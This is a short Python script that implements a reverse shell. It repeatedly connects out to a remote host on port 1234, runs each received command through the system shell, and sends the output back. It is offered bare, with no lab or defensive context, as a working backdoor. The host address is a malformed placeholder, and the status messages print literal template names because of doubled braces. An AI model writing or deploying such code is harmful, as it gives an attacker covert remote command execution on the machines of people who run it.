import socket
import subprocess
import time


def connect_back():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect(('our.22.11.146', 1234))
            print(f"[+] Connected to {{SERVER_IP}}:{{SERVER_PORT}}")

            while True:
                command = s.recv(1024).decode()
                if command.lower() in ('exit', 'quit'):
                    break

                # Execute shell command
                try:
                    output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
                except subprocess.CalledProcessError as e:
                    output = e.output

                if not output:
                    output = b"[+] Command executed, no output.\n"
                s.sendall(output)

        except Exception as e:
            print(f"[-] Connection failed: {{e}}")
            time.sleep(5)  # Retry after delay
        finally:
            s.close()

if __name__ == "__main__":
    connect_back()
